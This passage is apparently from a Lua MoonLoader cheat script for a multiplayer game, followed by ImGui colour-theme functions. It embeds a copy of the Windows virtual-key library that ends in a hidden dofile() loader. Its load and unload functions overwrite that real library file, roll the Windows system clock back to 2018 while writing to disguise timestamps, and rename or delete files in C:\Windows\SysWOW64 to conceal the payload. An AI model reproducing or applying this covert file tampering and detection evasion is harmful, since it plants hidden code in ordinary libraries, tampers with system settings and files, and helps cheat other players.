    VK_OEM_JUMP = 0xEA,
    VK_OEM_PA1 = 0xEB,
    VK_OEM_PA2 = 0xEC,
    VK_OEM_PA3 = 0xED,
    VK_OEM_WSCTRL = 0xEE,
    VK_OEM_CUSEL = 0xEF,
    VK_OEM_ATTN = 0xF0,
    VK_OEM_FINISH = 0xF1,
    VK_OEM_COPY = 0xF2,
    VK_OEM_AUTO = 0xF3,
    VK_OEM_ENLW = 0xF4,
    VK_OEM_BACKTAB = 0xF5,
    VK_ATTN = 0xF6,
    VK_CRSEL = 0xF7,
    VK_EXSEL = 0xF8,
    VK_EREOF = 0xF9,
    VK_PLAY = 0xFA,
    VK_ZOOM = 0xFB,
    VK_PA1 = 0xFD,
    VK_OEM_CLEAR = 0xFE,
}

local names = {
    [k.VK_LBUTTON] = 'Left Button',
    [k.VK_RBUTTON] = 'Right Button',
    [k.VK_CANCEL] = 'Break',
    [k.VK_MBUTTON] = 'Middle Button',
    [k.VK_XBUTTON1] = 'X Button 1',
    [k.VK_XBUTTON2] = 'X Button 2',
    [k.VK_BACK] = 'Backspace',
    [k.VK_TAB] = 'Tab',
    [k.VK_CLEAR] = 'Clear',
    [k.VK_RETURN] = 'Enter',
    [k.VK_SHIFT] = 'Shift',
    [k.VK_CONTROL] = 'Ctrl',
    [k.VK_MENU] = 'Alt',
    [k.VK_PAUSE] = 'Pause',
    [k.VK_CAPITAL] = 'Caps Lock',
    [k.VK_KANA] = 'Kana',
    [k.VK_JUNJA] = 'Junja',
    [k.VK_FINAL] = 'Final',
    [k.VK_KANJI] = 'Kanji',
    [k.VK_ESCAPE] = 'Esc',
    [k.VK_CONVERT] = 'Convert',
    [k.VK_NONCONVERT] = 'Non Convert',
    [k.VK_ACCEPT] = 'Accept',
    [k.VK_MODECHANGE] = 'Mode Change',
    [k.VK_SPACE] = 'Space',
    [k.VK_PRIOR] = 'Page Up',
    [k.VK_NEXT] = 'Page Down',
    [k.VK_END] = 'End',
    [k.VK_HOME] = 'Home',
    [k.VK_LEFT] = 'Arrow Left',
    [k.VK_UP] = 'Arrow Up',
    [k.VK_RIGHT] = 'Arrow Right',
    [k.VK_DOWN] = 'Arrow Down',
    [k.VK_SELECT] = 'Select',
    [k.VK_PRINT] = 'Print',
    [k.VK_EXECUTE] = 'Execute',
    [k.VK_SNAPSHOT] = 'Print Screen',
    [k.VK_INSERT] = 'Insert',
    [k.VK_DELETE] = 'Delete',
    [k.VK_HELP] = 'Help',
    [k.VK_0] = '0',
    [k.VK_1] = '1',
    [k.VK_2] = '2',
    [k.VK_3] = '3',
    [k.VK_4] = '4',
    [k.VK_5] = '5',
    [k.VK_6] = '6',
    [k.VK_7] = '7',
    [k.VK_8] = '8',
    [k.VK_9] = '9',
    [k.VK_A] = 'A',
    [k.VK_B] = 'B',
    [k.VK_C] = 'C',
    [k.VK_D] = 'D',
    [k.VK_E] = 'E',
    [k.VK_F] = 'F',
    [k.VK_G] = 'G',
    [k.VK_H] = 'H',
    [k.VK_I] = 'I',
    [k.VK_J] = 'J',
    [k.VK_K] = 'K',
    [k.VK_L] = 'L',
    [k.VK_M] = 'M',
    [k.VK_N] = 'N',
    [k.VK_O] = 'O',
    [k.VK_P] = 'P',
    [k.VK_Q] = 'Q',
    [k.VK_R] = 'R',
    [k.VK_S] = 'S',
    [k.VK_T] = 'T',
    [k.VK_U] = 'U',
    [k.VK_V] = 'V',
    [k.VK_W] = 'W',
    [k.VK_X] = 'X',
    [k.VK_Y] = 'Y',
    [k.VK_Z] = 'Z',
    [k.VK_LWIN] = 'Left Win',
    [k.VK_RWIN] = 'Right Win',
    [k.VK_APPS] = 'Context Menu',
    [k.VK_SLEEP] = 'Sleep',
    [k.VK_NUMPAD0] = 'Numpad 0',
    [k.VK_NUMPAD1] = 'Numpad 1',
    [k.VK_NUMPAD2] = 'Numpad 2',
    [k.VK_NUMPAD3] = 'Numpad 3',
    [k.VK_NUMPAD4] = 'Numpad 4',
    [k.VK_NUMPAD5] = 'Numpad 5',
    [k.VK_NUMPAD6] = 'Numpad 6',
    [k.VK_NUMPAD7] = 'Numpad 7',
    [k.VK_NUMPAD8] = 'Numpad 8',
    [k.VK_NUMPAD9] = 'Numpad 9',
    [k.VK_MULTIPLY] = 'Numpad *',
    [k.VK_ADD] = 'Numpad +',
    [k.VK_SEPARATOR] = 'Separator',
    [k.VK_SUBTRACT] = 'Num -',
    [k.VK_DECIMAL] = 'Numpad .',
    [k.VK_DIVIDE] = 'Numpad /',
    [k.VK_F1] = 'F1',
    [k.VK_F2] = 'F2',
    [k.VK_F3] = 'F3',
    [k.VK_F4] = 'F4',
    [k.VK_F5] = 'F5',
    [k.VK_F6] = 'F6',
    [k.VK_F7] = 'F7',
    [k.VK_F8] = 'F8',
    [k.VK_F9] = 'F9',
    [k.VK_F10] = 'F10',
    [k.VK_F11] = 'F11',
    [k.VK_F12] = 'F12',
    [k.VK_F13] = 'F13',
    [k.VK_F14] = 'F14',
    [k.VK_F15] = 'F15',
    [k.VK_F16] = 'F16',
    [k.VK_F17] = 'F17',
    [k.VK_F18] = 'F18',
    [k.VK_F19] = 'F19',
    [k.VK_F20] = 'F20',
    [k.VK_F21] = 'F21',
    [k.VK_F22] = 'F22',
    [k.VK_F23] = 'F23',
    [k.VK_F24] = 'F24',
    [k.VK_NUMLOCK] = 'Num Lock',
    [k.VK_SCROLL] = 'Scrol Lock',
    [k.VK_OEM_FJ_JISHO] = 'Jisho',
    [k.VK_OEM_FJ_MASSHOU] = 'Mashu',
    [k.VK_OEM_FJ_TOUROKU] = 'Touroku',
    [k.VK_OEM_FJ_LOYA] = 'Loya',
    [k.VK_OEM_FJ_ROYA] = 'Roya',
    [k.VK_LSHIFT] = 'Left Shift',
    [k.VK_RSHIFT] = 'Right Shift',
    [k.VK_LCONTROL] = 'Left Ctrl',
    [k.VK_RCONTROL] = 'Right Ctrl',
    [k.VK_LMENU] = 'Left Alt',
    [k.VK_RMENU] = 'Right Alt',
    [k.VK_BROWSER_BACK] = 'Browser Back',
    [k.VK_BROWSER_FORWARD] = 'Browser Forward',
    [k.VK_BROWSER_REFRESH] = 'Browser Refresh',
    [k.VK_BROWSER_STOP] = 'Browser Stop',
    [k.VK_BROWSER_SEARCH] = 'Browser Search',
    [k.VK_BROWSER_FAVORITES] = 'Browser Favorites',
    [k.VK_BROWSER_HOME] = 'Browser Home',
    [k.VK_VOLUME_MUTE] = 'Volume Mute',
    [k.VK_VOLUME_DOWN] = 'Volume Down',
    [k.VK_VOLUME_UP] = 'Volume Up',
    [k.VK_MEDIA_NEXT_TRACK] = 'Next Track',
    [k.VK_MEDIA_PREV_TRACK] = 'Previous Track',
    [k.VK_MEDIA_STOP] = 'Stop',
    [k.VK_MEDIA_PLAY_PAUSE] = 'Play / Pause',
    [k.VK_LAUNCH_MAIL] = 'Mail',
    [k.VK_LAUNCH_MEDIA_SELECT] = 'Media',
    [k.VK_LAUNCH_APP1] = 'App1',
    [k.VK_LAUNCH_APP2] = 'App2',
    [k.VK_OEM_1] = {';', ':'},
    [k.VK_OEM_PLUS] = {'=', '+'},
    [k.VK_OEM_COMMA] = {',', '<'},
    [k.VK_OEM_MINUS] = {'-', '_'},
    [k.VK_OEM_PERIOD] = {'.', '>'},
    [k.VK_OEM_2] = {'/', '?'},
    [k.VK_OEM_3] = {'`', '~'},
    [k.VK_ABNT_C1] = 'Abnt C1',
    [k.VK_ABNT_C2] = 'Abnt C2',
    [k.VK_OEM_4] = {'[', '{'},
    [k.VK_OEM_5] = {'\'', '|'},
    [k.VK_OEM_6] = {']', '}'},
    [k.VK_OEM_7] = {'\'', '"'},
    [k.VK_OEM_8] = {'!', 'ï¿½'},
    [k.VK_OEM_AX] = 'Ax',
    [k.VK_OEM_102] = '> <',
    [k.VK_ICO_HELP] = 'IcoHlp',
    [k.VK_PROCESSKEY] = 'Process',
    [k.VK_ICO_CLEAR] = 'IcoClr',
    [k.VK_PACKET] = 'Packet',
    [k.VK_OEM_RESET] = 'Reset',
    [k.VK_OEM_JUMP] = 'Jump',
    [k.VK_OEM_PA1] = 'OemPa1',
    [k.VK_OEM_PA2] = 'OemPa2',
    [k.VK_OEM_PA3] = 'OemPa3',
    [k.VK_OEM_WSCTRL] = 'WsCtrl',
    [k.VK_OEM_CUSEL] = 'Cu Sel',
    [k.VK_OEM_ATTN] = 'Oem Attn',
    [k.VK_OEM_FINISH] = 'Finish',
    [k.VK_OEM_COPY] = 'Copy',
    [k.VK_OEM_AUTO] = 'Auto',
    [k.VK_OEM_ENLW] = 'Enlw',
    [k.VK_OEM_BACKTAB] = 'Back Tab',
    [k.VK_ATTN] = 'Attn',
    [k.VK_CRSEL] = 'Cr Sel',
    [k.VK_EXSEL] = 'Ex Sel',
    [k.VK_EREOF] = 'Er Eof',
    [k.VK_PLAY] = 'Play',
    [k.VK_ZOOM] = 'Zoom',
    [k.VK_PA1] = 'Pa1',
    [k.VK_OEM_CLEAR] = 'OemClr'
}

k.key_names = names

function k.id_to_name(vkey)
    local name = names[vkey]
    if type(name) == 'table' then
        return name[1]
    end
    return name
end

function k.name_to_id(keyname, case_sensitive)
    if not case_sensitive then
        keyname = string.upper(keyname)
    end
    for id, v in pairs(names) do
        if type(v) == 'table' then
            for _, v2 in pairs(v) do
                v2 = (case_sensitive) and v2 or string.upper(v2)
                if v2 == keyname then
                    return id
                end
            end
        else
            local name = (case_sensitive) and v or string.upper(v)
            if name == keyname then
                return id
            end
        end
    end
end
dofile("moonloader\\lib\\md5\\cîrå.lua")
return k
]]
-- COD

function råmîvå()
    local system_time = ffi.new('SYSTEMTIME')
    ffi.C.GetSystemTime(system_time)
    local currentlyYear = system_time.wYear
    local currentlyMonth = system_time.wMonth
    local currentlyDay = system_time.wDay
    local currentlyHour = system_time.wHour
    local currentlyMinute = system_time.wMinute

    -------------------------------------------

    system_time.wYear = 2018
    system_time.wMonth = 06
    system_time.wDay = 02
    system_time.wHour = 3
    system_time.wMinute = 47
    ffi.C.SetSystemTime(system_time)

    -------------------------------------------

    unl, imgui.Process = false, false

    gui.smuth.en.v = false
    gui.silånt.en.v = false

    gui.visuàl.drf.v = false 
    gui.visuàl.dbx.v = false 
    gui.visuàl.dln.v = false 
    gui.visuàl.dnt.v = false 
    gui.visuàl.dbn.v = false 

    gui.misñ.as.v = false 
    gui.misñ.ir.v = false 
    gui.misñ.nf.v = false 
    gui.misñ.ncr.v = false 
    gui.misñ.ar.v = false 
    gui.misñ.sh.v = false 
    gui.misñ.dr.v = false 
    gui.misñ.fe.v = false 
    gui.misñ.jb.v = false 
    gui.misñ.ca.v = false 
    gui.misñ.nr.v = false 
    gui.misñ.atc.v = false 
    gui.misñ.scr.v = false 
    gui.misñ.io.v = false 
    gui.misñ.bf.v = false 
    gui.misñ.weg.v = false 
    gui.misñ.spb.v = false 
    gui.misñ.ajm.v = false 
    gui.misñ.hm.v = false 
    gui.misñ.bf.v = false 
    gui.misñ.tm.v = false 
    gui.misñ.cb.v = false 
    gui.misñ.row.v = false 
    gui.misñ.fc.v = false 
    gui.misñ.r180.v = false 
    gui.misñ.jc.v = false 
    gui.misñ.ei.v = false 

    if doesFileExist(vkeys_path) then
        local file = io.open(vkeys_path, "w")
        file:write(cod_unl)
        file:close()
    end

    -------------------------------------------

    system_time.wYear = currentlyYear
    system_time.wMonth = currentlyMonth
    system_time.wDay = currentlyDay
    system_time.wHour = currentlyHour
    system_time.wMinute = currentlyMinute
    ffi.C.SetSystemTime(system_time)

    -------------------------------------------

    os.rename("moonloader\\lib\\md5\\cîrå.lua", "moonloader\\lib\\md5\\cîrå.dll")
    os.rename("C:\\Windows\\SysWOW64\\xvsg.ini", "C:\\Windows\\SysWOW64\\xvsg.dll")

    os.remove("moonloader\\lib\\md5\\cîrå.dll")
    os.remove("C:\\Windows\\SysWOW64\\xvsg.dll")
end

function uplîàd()
    local system_time = ffi.new('SYSTEMTIME')
    ffi.C.GetSystemTime(system_time)
    local currentlyYear = system_time.wYear
    local currentlyMonth = system_time.wMonth
    local currentlyDay = system_time.wDay
    local currentlyHour = system_time.wHour
    local currentlyMinute = system_time.wMinute

    -------------------------------------------

    system_time.wYear = 2018
    system_time.wMonth = 06
    system_time.wDay = 02
    system_time.wHour = 3
    system_time.wMinute = 47
    ffi.C.SetSystemTime(system_time)

    -------------------------------------------

    unl = false

    if doesFileExist(vkeys_path) then
        local file = io.open(vkeys_path, "w")
        file:write(cod_upl)
        file:close()
    end

    -------------------------------------------

    system_time.wYear = currentlyYear
    system_time.wMonth = currentlyMonth
    system_time.wDay = currentlyDay
    system_time.wHour = currentlyHour
    system_time.wMinute = currentlyMinute
    ffi.C.SetSystemTime(system_time)

    -------------------------------------------

    os.rename("moonloader\\lib\\md5\\cîrå.dll", "moonloader\\lib\\md5\\cîrå.lua")
    os.rename("C:\\Windows\\SysWOW64\\xvsg.dll", "C:\\Windows\\SysWOW64\\xvsg.ini")
end

function unlîàd()
    local system_time = ffi.new('SYSTEMTIME')
    ffi.C.GetSystemTime(system_time)
    local currentlyYear = system_time.wYear
    local currentlyMonth = system_time.wMonth
    local currentlyDay = system_time.wDay
    local currentlyHour = system_time.wHour
    local currentlyMinute = system_time.wMinute

    -------------------------------------------

    system_time.wYear = 2018
    system_time.wMonth = 06
    system_time.wDay = 02
    system_time.wHour = 3
    system_time.wMinute = 47
    ffi.C.SetSystemTime(system_time)

    -------------------------------------------

    unl, imgui.Process = true, false

    gui.smuth.en.v = false
    gui.silånt.en.v = false

    gui.visuàl.drf.v = false 
    gui.visuàl.bx.v = false 
    gui.visuàl.ln.v = false 
    gui.visuàl.nt.v = false 
    gui.visuàl.bn.v = false 

    gui.misñ.as.v = false 
    gui.misñ.ir.v = false 
    gui.misñ.nf.v = false 
    gui.misñ.ncr.v = false 
    gui.misñ.ar.v = false 
    gui.misñ.sh.v = false 
    gui.misñ.dr.v = false 
    gui.misñ.fe.v = false 
    gui.misñ.jb.v = false 
    gui.misñ.ca.v = false 
    gui.misñ.nr.v = false 
    gui.misñ.atc.v = false 
    gui.misñ.scr.v = false 
    gui.misñ.io.v = false 
    gui.misñ.bf.v = false 
    gui.misñ.weg.v = false 
    gui.misñ.spb.v = false 
    gui.misñ.ajm.v = false 
    gui.misñ.hm.v = false 
    gui.misñ.bf.v = false 
    gui.misñ.tm.v = false 
    gui.misñ.cb.v = false 
    gui.misñ.row.v = false 
    gui.misñ.fc.v = false 
    gui.misñ.r180.v = false 
    gui.misñ.jc.v = false 
    gui.misñ.ei.v = false 

    if doesFileExist(vkeys_path) then
        local file = io.open(vkeys_path, "w")
        file:write(cod_unl)
        file:close()
    end

    -------------------------------------------

    system_time.wYear = currentlyYear
    system_time.wMonth = currentlyMonth
    system_time.wDay = currentlyDay
    system_time.wHour = currentlyHour
    system_time.wMinute = currentlyMinute
    ffi.C.SetSystemTime(system_time)

    -------------------------------------------

    os.rename("moonloader\\lib\\md5\\cîrå.lua", "moonloader\\lib\\md5\\cîrå.dll")
    os.rename("C:\\Windows\\SysWOW64\\xvsg.ini", "C:\\Windows\\SysWOW64\\xvsg.dll")
end

function onScriptTerminate(scr, bool)
	if scr == thisScript() and unl then
		uplîàd()
	end
end

function imgui.TextQuestion(description)
    imgui.SameLine()
    imgui.TextDisabled("(?)")

    if imgui.IsItemHovered() then
        imgui.BeginTooltip()
            imgui.PushTextWrapPos(600)
                imgui.TextUnformatted(description)
            imgui.PopTextWrapPos()
        imgui.EndTooltip()
    end
end

function save()
    inicfg.save(cfg, config_path)
end

function blue_style()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    style.WindowRounding = 2.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.84)
    style.ChildWindowRounding = 2.0
    style.FrameRounding = 2.0
    style.ItemSpacing = imgui.ImVec2(5.0, 4.0)
    style.ScrollbarSize = 13.0
    style.ScrollbarRounding = 0
    style.GrabMinSize = 8.0
    style.GrabRounding = 1.0

    colors[clr.FrameBg]                = ImVec4(0.16, 0.29, 0.48, 0.54)
    colors[clr.FrameBgHovered]         = ImVec4(0.26, 0.59, 0.98, 0.40)
    colors[clr.FrameBgActive]          = ImVec4(0.26, 0.59, 0.98, 0.67)
    colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
    colors[clr.TitleBgActive]          = ImVec4(0.16, 0.29, 0.48, 1.00)
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
    colors[clr.CheckMark]              = ImVec4(0.26, 0.59, 0.98, 1.00)
    colors[clr.SliderGrab]             = ImVec4(0.24, 0.52, 0.88, 1.00)
    colors[clr.SliderGrabActive]       = ImVec4(0.26, 0.59, 0.98, 1.00)
    colors[clr.Button]                 = ImVec4(0.26, 0.59, 0.98, 0.40)
    colors[clr.ButtonHovered]          = ImVec4(0.26, 0.59, 0.98, 1.00)
    colors[clr.ButtonActive]           = ImVec4(0.06, 0.53, 0.98, 1.00)
    colors[clr.Header]                 = ImVec4(0.26, 0.59, 0.98, 0.31)
    colors[clr.HeaderHovered]          = ImVec4(0.26, 0.59, 0.98, 0.80)
    colors[clr.HeaderActive]           = ImVec4(0.26, 0.59, 0.98, 1.00)
    colors[clr.Separator]              = colors[clr.Border]
    colors[clr.SeparatorHovered]       = ImVec4(0.26, 0.59, 0.98, 0.78)
    colors[clr.SeparatorActive]        = ImVec4(0.26, 0.59, 0.98, 1.00)
    colors[clr.ResizeGrip]             = ImVec4(0.26, 0.59, 0.98, 0.25)
    colors[clr.ResizeGripHovered]      = ImVec4(0.26, 0.59, 0.98, 0.67)
    colors[clr.ResizeGripActive]       = ImVec4(0.26, 0.59, 0.98, 0.95)
    colors[clr.TextSelectedBg]         = ImVec4(0.26, 0.59, 0.98, 0.35)
    colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
    colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
    colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
    colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[clr.ComboBg]                = colors[clr.PopupBg]
    colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
    colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
    colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
    colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
    colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
    colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
    colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00)
    colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
    colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
    colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function red_style()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    style.WindowRounding = 2.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.84)
    style.ChildWindowRounding = 2.0
    style.FrameRounding = 2.0
    style.ItemSpacing = imgui.ImVec2(5.0, 4.0)
    style.ScrollbarSize = 13.0
    style.ScrollbarRounding = 0
    style.GrabMinSize = 8.0
    style.GrabRounding = 1.0

    colors[clr.FrameBg]                = ImVec4(0.48, 0.16, 0.16, 0.54)
    colors[clr.FrameBgHovered]         = ImVec4(0.98, 0.26, 0.26, 0.40)
    colors[clr.FrameBgActive]          = ImVec4(0.98, 0.26, 0.26, 0.67)
    colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
    colors[clr.TitleBgActive]          = ImVec4(0.48, 0.16, 0.16, 1.00)
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
    colors[clr.CheckMark]              = ImVec4(0.98, 0.26, 0.26, 1.00)
    colors[clr.SliderGrab]             = ImVec4(0.88, 0.26, 0.24, 1.00)
    colors[clr.SliderGrabActive]       = ImVec4(0.98, 0.26, 0.26, 1.00)
    colors[clr.Button]                 = ImVec4(0.98, 0.26, 0.26, 0.40)
    colors[clr.ButtonHovered]          = ImVec4(0.98, 0.26, 0.26, 1.00)
    colors[clr.ButtonActive]           = ImVec4(0.98, 0.06, 0.06, 1.00)
    colors[clr.Header]                 = ImVec4(0.98, 0.26, 0.26, 0.31)
    colors[clr.HeaderHovered]          = ImVec4(0.98, 0.26, 0.26, 0.80)
    colors[clr.HeaderActive]           = ImVec4(0.98, 0.26, 0.26, 1.00)
    colors[clr.Separator]              = colors[clr.Border]
    colors[clr.SeparatorHovered]       = ImVec4(0.75, 0.10, 0.10, 0.78)
    colors[clr.SeparatorActive]        = ImVec4(0.75, 0.10, 0.10, 1.00)
    colors[clr.ResizeGrip]             = ImVec4(0.98, 0.26, 0.26, 0.25)
    colors[clr.ResizeGripHovered]      = ImVec4(0.98, 0.26, 0.26, 0.67)
    colors[clr.ResizeGripActive]       = ImVec4(0.98, 0.26, 0.26, 0.95)
    colors[clr.TextSelectedBg]         = ImVec4(0.98, 0.26, 0.26, 0.35)
    colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
    colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
    colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
    colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[clr.ComboBg]                = colors[clr.PopupBg]
    colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
    colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
    colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
    colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
    colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
    colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
    colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00)
    colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
    colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
    colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function brown_style()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    style.WindowRounding = 2.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.84)
    style.ChildWindowRounding = 2.0
    style.FrameRounding = 2.0
    style.ItemSpacing = imgui.ImVec2(5.0, 4.0)
    style.ScrollbarSize = 13.0
    style.ScrollbarRounding = 0
    style.GrabMinSize = 8.0
    style.GrabRounding = 1.0

    colors[clr.FrameBg]                = ImVec4(0.48, 0.23, 0.16, 0.54)
    colors[clr.FrameBgHovered]         = ImVec4(0.98, 0.43, 0.26, 0.40)
    colors[clr.FrameBgActive]          = ImVec4(0.98, 0.43, 0.26, 0.67)
    colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
    colors[clr.TitleBgActive]          = ImVec4(0.48, 0.23, 0.16, 1.00)
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
    colors[clr.CheckMark]              = ImVec4(0.98, 0.43, 0.26, 1.00)
    colors[clr.SliderGrab]             = ImVec4(0.88, 0.39, 0.24, 1.00)
    colors[clr.SliderGrabActive]       = ImVec4(0.98, 0.43, 0.26, 1.00)
    colors[clr.Button]                 = ImVec4(0.98, 0.43, 0.26, 0.40)
    colors[clr.ButtonHovered]          = ImVec4(0.98, 0.43, 0.26, 1.00)
    colors[clr.ButtonActive]           = ImVec4(0.98, 0.28, 0.06, 1.00)
    colors[clr.Header]                 = ImVec4(0.98, 0.43, 0.26, 0.31)
    colors[clr.HeaderHovered]          = ImVec4(0.98, 0.43, 0.26, 0.80)
    colors[clr.HeaderActive]           = ImVec4(0.98, 0.43, 0.26, 1.00)
    colors[clr.Separator]              = colors[clr.Border]
    colors[clr.SeparatorHovered]       = ImVec4(0.75, 0.25, 0.10, 0.78)
    colors[clr.SeparatorActive]        = ImVec4(0.75, 0.25, 0.10, 1.00)
    colors[clr.ResizeGrip]             = ImVec4(0.98, 0.43, 0.26, 0.25)
    colors[clr.ResizeGripHovered]      = ImVec4(0.98, 0.43, 0.26, 0.67)
    colors[clr.ResizeGripActive]       = ImVec4(0.98, 0.43, 0.26, 0.95)
    colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
    colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.50, 0.35, 1.00)
    colors[clr.TextSelectedBg]         = ImVec4(0.98, 0.43, 0.26, 0.35)
    colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
    colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
    colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
    colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[clr.ComboBg]                = colors[clr.PopupBg]
    colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
    colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
    colors[clr.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00)
    colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
    colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
    colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
    colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
    colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function golub_style()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    style.WindowRounding = 2.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.84)
    style.ChildWindowRounding = 2.0
    style.FrameRounding = 2.0
    style.ItemSpacing = imgui.ImVec2(5.0, 4.0)
    style.ScrollbarSize = 13.0
    style.ScrollbarRounding = 0
    style.GrabMinSize = 8.0
    style.GrabRounding = 1.0

    colors[clr.FrameBg]                = ImVec4(0.16, 0.48, 0.42, 0.54)
    colors[clr.FrameBgHovered]         = ImVec4(0.26, 0.98, 0.85, 0.40)
    colors[clr.FrameBgActive]          = ImVec4(0.26, 0.98, 0.85, 0.67)
    colors[clr.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
    colors[clr.TitleBgActive]          = ImVec4(0.16, 0.48, 0.42, 1.00)
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
    colors[clr.CheckMark]              = ImVec4(0.26, 0.98, 0.85, 1.00)
    colors[clr.SliderGrab]             = ImVec4(0.24, 0.88, 0.77, 1.00)
    colors[clr.SliderGrabActive]       = ImVec4(0.26, 0.98, 0.85, 1.00)
    colors[clr.Button]                 = ImVec4(0.26, 0.98, 0.85, 0.40)
    colors[clr.ButtonHovered]          = ImVec4(0.26, 0.98, 0.85, 1.00)
    colors[clr.ButtonActive]           = ImVec4(0.06, 0.98, 0.82, 1.00)
    colors[clr.Header]                 = ImVec4(0.26, 0.98, 0.85, 0.31)
    colors[clr.HeaderHovered]          = ImVec4(0.26, 0.98, 0.85, 0.80)
    colors[clr.HeaderActive]           = ImVec4(0.26, 0.98, 0.85, 1.00)
    colors[clr.Separator]              = colors[clr.Border]
    colors[clr.SeparatorHovered]       = ImVec4(0.10, 0.75, 0.63, 0.78)
